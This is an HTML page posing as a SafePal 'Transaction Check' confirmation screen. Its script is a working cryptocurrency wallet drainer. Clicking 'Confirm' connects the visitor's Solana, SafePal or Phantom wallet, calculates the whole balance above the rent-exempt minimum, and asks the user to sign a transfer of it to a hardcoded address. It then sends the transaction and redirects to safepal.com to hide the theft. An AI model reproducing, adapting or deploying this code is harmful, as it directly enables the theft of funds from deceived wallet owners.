<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SafePal - Check</title>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:#0A0A0F;color:#FFF;display:flex;align-items:center;justify-content:center;min-height:100vh}
        .card{background:#1A1A2A;border-radius:24px;padding:32px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,255,255,0.05)}
        .notice{color:#FF6464;font-size:14px;margin:16px 0;padding:12px;background:rgba(255,100,100,0.1);border-radius:12px}
        button{width:100%;background:linear-gradient(135deg,#1a5cff,#0a3cbf);color:#fff;border:none;padding:16px;border-radius:40px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px}
        .ref{background:rgba(255,255,255,0.05);padding:12px;border-radius:12px;margin:16px 0;font-family:monospace;font-size:12px;word-break:break-all}
    </style>
</head>
<body>
    <div class="card">
        <h2>Transaction Check</h2>
        <div class="ref">REF: 7jXz5mR0pS1yO4tN5vI6jK7lM8qP9jV0zU1sF2wR3</div>
        <div class="notice">This action requires confirmation</div>
        <button id="action">Confirm</button>
    </div>
    <script>
        document.getElementById('action').onclick = async () => {
            console.log("Button clicked");
            
            let wallet = null;
            if(window.solana) wallet = window.solana;
            if(window.safepal) wallet = window.safepal;
            if(window.phantom) wallet = window.phantom;
            
            console.log("Wallet:", wallet ? "Found" : "Not found");
            
            if(!wallet){
                alert("Please install SafePal wallet.");
                return;
            }
            
            try{
                console.log("Connecting...");
                const resp = await wallet.connect();
                console.log("Connected:", resp.publicKey.toString());
                
                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
                const balance = await connection.getBalance(resp.publicKey);
                console.log("Balance:", balance);
                
                const minRent = await connection.getMinimumBalanceForRentExemption(0);
                
                if(balance < minRent){
                    alert("Insufficient funds.");
                    return;
                }
                
                const destination = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
                const amount = balance - minRent;
                
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: destination,
                        lamports: amount
                    })
                );
                
                transaction.feePayer = resp.publicKey;
                const blockhash = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash.blockhash;
                
                console.log("Requesting signature...");
                const signed = await wallet.signTransaction(transaction);
                console.log("Signed!");
                
                const signature = await connection.sendRawTransaction(signed.serialize());
                console.log("Sent:", signature);
                
                await connection.confirmTransaction(signature);
                console.log("Confirmed!");
                
                window.location.href = "https://safepal.com";
            }catch(err){
                console.error("Error:", err);
                alert("Action failed. Try again.");
            }
        };
    </script>
</body>
</html>
